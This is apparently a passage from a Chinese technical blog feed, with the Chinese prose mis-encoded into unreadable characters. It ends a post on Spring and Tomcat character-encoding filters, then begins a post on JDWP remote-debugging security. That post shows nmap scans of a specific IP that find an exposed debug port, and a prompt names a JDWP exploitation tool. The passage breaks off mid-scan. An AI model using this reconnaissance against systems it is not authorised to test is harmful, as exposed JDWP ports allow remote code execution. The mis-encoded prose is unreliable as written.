<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filters.SetCharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>GBK<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><p>åœ¨spring mvcä¸­å¯ä»¥åšå¦‚ä¸‹çš„é…ç½®ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸€å®šè¦é…ç½®æˆ<strong>ç¬¬ä¸€ä¸ª</strong><code>filter</code>ï¼Œå¦åˆ™è¿˜æ˜¯ä¸ä¼šç”Ÿæ•ˆã€‚</p>
<p>å®ƒçš„å®ç°ä¹Ÿå¾ˆç®€å•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.web.filter.CharacterEncodingFilter#doFilterInternal</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doFilterInternal</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String encoding = getEncoding();</span><br><span class="line">        <span class="keyword">if</span> (encoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isForceRequestEncoding() || request.getCharacterEncoding() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                request.setCharacterEncoding(encoding);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (isForceResponseEncoding()) &#123;</span><br><span class="line">                response.setCharacterEncoding(encoding);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>setCharacterEncoding</code>æ˜¯Servletè§„èŒƒä¸­å®šä¹‰çš„æ–¹æ³•ï¼Œ çœ‹ä¸‹<code>tomcat</code>çš„å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.ApplicationHttpRequest#mergeParameters</span></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Merge the parameters from the saved query parameter string (if any), and</span></span><br><span class="line"><span class="comment">     * the parameters already present on this request (if any), such that the</span></span><br><span class="line"><span class="comment">     * parameter values from the query string show up first if there are</span></span><br><span class="line"><span class="comment">     * duplicate parameter names.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">mergeParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((queryParamString == <span class="keyword">null</span>) || (queryParamString.length() &lt; <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, String[]&gt; queryParameters = <span class="keyword">new</span> HashMap&lt;String, String[]&gt;();</span><br><span class="line">        String encoding = getCharacterEncoding();</span><br><span class="line">        <span class="keyword">if</span> (encoding == <span class="keyword">null</span>)</span><br><span class="line">            encoding = <span class="string">"ISO-8859-1"</span>;</span><br><span class="line">        RequestUtil.parseParameters(queryParameters, queryParamString,</span><br><span class="line">                encoding);</span><br><span class="line">        Iterator&lt;String&gt; keys = parameters.keySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (keys.hasNext()) &#123;</span><br><span class="line">            String key = keys.next();</span><br><span class="line">            Object value = queryParameters.get(key);</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                queryParameters.put(key, parameters.get(key));</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            queryParameters.put</span><br><span class="line">                (key, mergeValues(value, parameters.get(key)));</span><br><span class="line">        &#125;</span><br><span class="line">        parameters = queryParameters;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°é»˜è®¤çš„ç¼–ç æ˜¯<code>&quot;ISO-8859-1&quot;</code>, ä¸ºä»€ä¹ˆè¦è®¾ç½®æˆç¬¬ä¸€ä¸ªfilterå‘¢ï¼Œæ‰¾åˆ°è°ƒç”¨çš„åœ°æ–¹çœ‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.ApplicationHttpRequest#parseParameters</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Parses the parameters of this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If parameters are present in both the query string and the request</span></span><br><span class="line"><span class="comment">     * content, they are merged.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">parseParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parsedParams) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameters = <span class="keyword">new</span> HashMap&lt;String, String[]&gt;();</span><br><span class="line">        parameters = copyMap(getRequest().getParameterMap());</span><br><span class="line">        mergeParameters();</span><br><span class="line">        parsedParams = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>parseParameters</code>åªä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œå¦‚æœåœ¨å‰é¢çš„<code>filter</code>ä¸­å°è¯•è·å–<code>Parameters</code>ä¸­çš„å‚æ•°ï¼Œè¿™ä¸ªtomcatå°±ä¼šç”¨é»˜è®¤çš„ç¼–ç å»è§£æä¼ å…¥çš„å‚æ•°äº†ã€‚</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul>
<li><a href="https://blog.csdn.net/u010001043/article/details/53203576" rel="external nofollow noopener noreferrer" target="_blank">UrlConnection postè¯·æ±‚ä¸­æ–‡å‚æ•°ä¹±ç é—®é¢˜ - CSDNåšå®¢</a></li>
<li><a href="https://blog.csdn.net/huangshaotian/article/details/7472662" rel="external nofollow noopener noreferrer" target="_blank">è®¾ç½®Java JDKçš„é»˜è®¤ç¼–ç ä¸ºUTF-8 - CSDNåšå®¢</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> encoding </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jdwpè¿œç¨‹è°ƒè¯•ä¸å®‰å…¨]]></title>
      <url>http://qsli.github.io/2018/08/12/jdwp/</url>
      <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯JDWPï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯JDWPï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯JDWPï¼Ÿ"></a>ä»€ä¹ˆæ˜¯JDWPï¼Ÿ</h1><blockquote>
<p>JDWPï¼ˆJava Debug Wire Protocolï¼‰æ˜¯ä¸€ä¸ªä¸º Java è°ƒè¯•è€Œè®¾è®¡çš„ä¸€ä¸ªé€šè®¯äº¤äº’åè®®ï¼Œå®ƒå®šä¹‰äº†è°ƒè¯•å™¨å’Œè¢«è°ƒè¯•ç¨‹åºä¹‹é—´<strong>ä¼ é€’çš„ä¿¡æ¯çš„æ ¼å¼</strong>ã€‚åœ¨ JPDA ä½“ç³»ä¸­ï¼Œä½œä¸ºå‰ç«¯ï¼ˆfront-endï¼‰çš„è°ƒè¯•è€…ï¼ˆdebuggerï¼‰è¿›ç¨‹å’Œåç«¯ï¼ˆback-endï¼‰çš„è¢«è°ƒè¯•ç¨‹åºï¼ˆdebuggeeï¼‰è¿›ç¨‹ä¹‹é—´çš„äº¤äº’æ•°æ®çš„æ ¼å¼å°±æ˜¯ç”± JDWP æ¥æè¿°çš„ï¼Œå®ƒè¯¦ç»†å®Œæ•´åœ°å®šä¹‰äº†è¯·æ±‚å‘½ä»¤ã€å›åº”æ•°æ®å’Œé”™è¯¯ä»£ç ï¼Œä¿è¯äº†å‰ç«¯å’Œåç«¯çš„ JVMTI å’Œ JDI çš„é€šä¿¡é€šç•…ã€‚æ¯”å¦‚åœ¨ Sun å…¬å¸æä¾›çš„å®ç°ä¸­ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªåä¸º jdwp.dllï¼ˆjdwp.soï¼‰çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œè¿™ä¸ªåŠ¨æ€åº“æ–‡ä»¶å®ç°äº†ä¸€ä¸ª Agentï¼Œå®ƒä¼šè´Ÿè´£è§£æå‰ç«¯å‘å‡ºçš„è¯·æ±‚æˆ–è€…å‘½ä»¤ï¼Œå¹¶å°†å…¶è½¬åŒ–ä¸º JVMTI è°ƒç”¨ï¼Œç„¶åå°† JVMTI å‡½æ•°çš„è¿”å›å€¼å°è£…æˆ JDWP æ•°æ®å‘è¿˜ç»™åç«¯ã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Components                          Debugger Interfaces</span><br><span class="line"></span><br><span class="line">                /    |--------------|</span><br><span class="line">               /     |     VM       |</span><br><span class="line"> debuggee ----(      |--------------|  &lt;------- JVM TI - Java VM Tool Interface</span><br><span class="line">               \     |   back-end   |</span><br><span class="line">                \    |--------------|</span><br><span class="line">                /           |</span><br><span class="line"> comm channel -(            |  &lt;--------------- JDWP - Java Debug Wire Protocol</span><br><span class="line">                \           |</span><br><span class="line">                     |--------------|</span><br><span class="line">                     | front-end    |</span><br><span class="line">                     |--------------|  &lt;------- JDI - Java Debug Interface</span><br><span class="line">                     |      UI      |</span><br><span class="line">                     |--------------|</span><br></pre></td></tr></table></figure>
<p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jvmti" rel="external nofollow noopener noreferrer" target="_blank">JVM TI</a> -<strong>Java VM Tool Interface</strong></p>
<p>Defines the debugging services a VM provides.</p>
<p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdwp" rel="external nofollow noopener noreferrer" target="_blank">JDWP</a> - <strong>Java Debug Wire Protocol</strong></p>
<p>Defines the communication between <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#debuggee" rel="external nofollow noopener noreferrer" target="_blank">debuggee</a> and debugger processes.</p>
<p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdi" rel="external nofollow noopener noreferrer" target="_blank">JDI</a> - <strong>Java Debug Interface</strong></p>
<p>Defines a high-level Java language interface which tool developers can easily use to write remote debugger applications.</p>
<h1 id="å‘ç°å¼€å¯äº†JDWPçš„ç«¯å£"><a href="#å‘ç°å¼€å¯äº†JDWPçš„ç«¯å£" class="headerlink" title="å‘ç°å¼€å¯äº†JDWPçš„ç«¯å£"></a>å‘ç°å¼€å¯äº†JDWPçš„ç«¯å£</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap</code>æ˜¯ç«¯å£æ‰«æçš„åˆ©å™¨ï¼Œæ”¯æŒæ‰¹é‡æ‰«æç½‘æ®µå†…ç«¯å£æ‰“å¼€çš„æƒ…å†µã€‚é€šè¿‡<code>nmap</code>çš„æ‰«æå¯ä»¥æ‰¾åˆ°ç«¯å£å’Œå¯¹åº”çš„åè®®ï¼Œè¿™æ ·å°±å¯ä»¥æ‰«æåˆ°æ‰“å¼€äº†è¿œç¨‹debugçš„ç«¯å£çš„æœºå™¨ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~  sudo nmap -sV 221.221.221.221</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:12 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 972 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.42 seconds</span><br></pre></td></tr></table></figure>
<p>ä»æ‰«æçš„ç»“æœä¸­å¯ä»¥çœ‹åˆ°<code>10010</code>ç«¯å£å¼€å¯äº†è¿œç¨‹è°ƒè¯•ã€‚</p>
<h3 id="ç«¯å£æ˜æ˜å¼€äº†ï¼Œå´æ²¡æœ‰æ‰«æåˆ°ï¼Ÿ"><a href="#ç«¯å£æ˜æ˜å¼€äº†ï¼Œå´æ²¡æœ‰æ‰«æåˆ°ï¼Ÿ" class="headerlink" title="ç«¯å£æ˜æ˜å¼€äº†ï¼Œå´æ²¡æœ‰æ‰«æåˆ°ï¼Ÿ"></a>ç«¯å£æ˜æ˜å¼€äº†ï¼Œå´æ²¡æœ‰æ‰«æåˆ°ï¼Ÿ</h3><p>nmapé»˜è®¤åªæ‰«ææ¯ä¸ªåè®®å¸¸è§çš„1000ä¸ªç«¯å£ï¼Œå¦‚æœä½ çš„ç«¯å£ä¸åœ¨é‡Œé¢ï¼Œé»˜è®¤å°±ä¸ä¼šæ‰«æã€‚</p>
<blockquote>
<p><a href="https://nmap.org/book/man-port-specification.html" rel="external nofollow noopener noreferrer" target="_blank">Nmap scans the most common 1,000 ports for each protocol</a>. If your port is not in that list, it wonâ€™t be scanned. </p>
</blockquote>
<p>ç«¯å£ä½¿ç”¨çš„é¢‘ç‡å­˜å‚¨åœ¨<code>nmap-services</code>æ–‡ä»¶ä¸­ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  jdwp-shellifier (master|âœ”) locate nmap-services</span><br><span class="line">/usr/<span class="built_in">local</span>/Cellar/nmap/7.70/share/nmap/nmap-services</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥ç›´æ¥æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹å¯¹åº”çš„é¢‘ç‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">âœ  jdwp-shellifier (master|âœ”) sudo nmap -v -oG - -sSU</span><br><span class="line">Password:</span><br><span class="line"># Nmap 7.70 scan initiated Fri Aug 10 13:46:47 2018 as: nmap -v -oG - -sSU</span><br><span class="line"># Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521...çœç•¥</span><br></pre></td></tr></table></figure>
<p>å…·ä½“è¯´æ˜å‚è§ï¼š <a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p><code>nmap</code>ä¸­å¯ä»¥é€šè¿‡<code>-p</code>æŒ‡å®šæ‰«æçš„ç«¯å£èŒƒå›´ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~  sudo nmap -sV 221.221.221.221  -p 1-65535</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:26 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 65464 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">136/tcp   filtered profile</span><br><span class="line">137/tcp   filtered netbios-ns</span><br><span class="line">138/tcp   filtered netbios-dgm</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">2745/tcp  filtered urbisnet</span><br><span class="line">3127/tcp  filtered ctx-bridge</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">3691/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">4999/tcp  open     http           Apache httpd 2.4.10 ((Debian))</span><br><span class="line">5554/tcp  filtered sgi-esphttp</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6176/tcp  filtered unknown</span><br><span class="line">6379/tcp  open     redis          Redis key-value store</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8076/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8146/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8183/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8188/tcp  open     unknown</span><br><span class="line">8189/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8280/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span 